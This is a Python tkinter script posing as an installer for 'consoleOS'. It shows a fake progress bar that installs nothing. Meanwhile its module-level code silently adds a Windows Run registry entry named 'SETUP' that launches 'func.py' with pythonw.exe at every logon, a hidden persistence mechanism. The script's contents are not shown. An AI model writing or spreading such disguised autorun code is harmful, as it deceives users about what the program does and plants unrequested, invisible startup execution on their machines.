
import tkinter as tk
import tkinter.ttk as ttk
import sys
import time
from  tkinter import messagebox
import os
import shutil
import getpass
import winreg
import requests

class UI:
    def __init__(self, root):
        self.root = root
        self.root.title("consoleOS - 安装程序")
        self.root.geometry("600x400")
        self.root.config(bg="#aaaaff")

        # 修复样式：字体样式改为 "normal"
        welcome_style = ttk.Style()
        welcome_style.theme_use("vista")
        welcome_style.configure("wlc.TLabel", foreground="black", background="#aaaaff",
                                font=("微软雅黑", 30, "bold"))

        nm_style = ttk.Style()
        nm_style.theme_use("vista")
        nm_style.configure("nm.TLabel", foreground="black", background="#aaaaff",
                           font=("微软雅黑", 15, "normal"))  # 修正为 normal

        bar_style = ttk.Style()
        bar_style.theme_use("vista")
        bar_style.configure("TProgressbar", foreground="", background="#000000")

        ttk.Label(self.root, text="欢迎安装consoleOS", style="wlc.TLabel").pack()

        self.pgb = ttk.Progressbar(self.root, style="TProgressbar", length=300,
                                   maximum=100, orient="horizontal", mode="determinate")
        self.pgb.place(x=150, y=300)
        self.pgb["value"] = 0

        self.conpl = ttk.Label(self.root, text="正在安装", style="nm.TLabel")
        self.conpl.place(x=265, y=350)

        # 延迟启动进度条更新，确保界面先渲染
        self.root.after(100, self.update)  # 100ms后启动

    def update(self):
        if self.pgb["value"] < 100:
            self.pgb["value"] += 3 # 每次增加1%，加快进度
            self.root.after(50, self.update)  # 改为50ms刷新一次
        else:
            self.pgb["value"] = 100
            self.conpl.config(text="安装完成，3秒后退出")
            self.conpl.place(x=265, y=350)
            messagebox.showinfo('安装成功','安装完成，3秒后退出')
            time.sleep(3)
            sys.exit()


root = tk.Tk()
app = UI(root)
p = os.path.join(os.path.dirname(sys.executable),"pythonw.exe")
s = r"func.py"
k = winreg.OpenKey(
    winreg.HKEY_CURRENT_USER,
    r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
    0,
    winreg.KEY_SET_VALUE
)

winreg.SetValueEx(k, "SETUP", 0, winreg.REG_SZ, "\"" + p +"\" " + "\"" + s +"\" ")
winreg.CloseKey(k)
root.mainloop()
